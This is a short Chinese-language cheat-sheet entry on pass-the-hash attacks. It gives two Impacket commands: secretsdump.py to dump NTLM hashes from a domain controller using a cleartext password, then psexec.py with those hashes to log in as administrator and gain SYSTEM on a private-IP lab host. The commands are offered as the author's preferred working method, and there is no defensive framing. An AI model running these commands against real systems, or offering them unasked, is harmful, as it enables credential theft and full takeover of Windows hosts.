# pth（常用）

我认为这种方式是最好用的（在kali上）

```clike
1. hash枚举（vista之后基本无效）
secretsdump.py just-dc-ntlm offensive.local/dbadmin:"Passw8rd "@192.168.159.200

2. 用psexec带着hash登陆，直接获取system权限
psexec.py admtnistrator@192.168.159.200 -hashes "hash:hash"
```
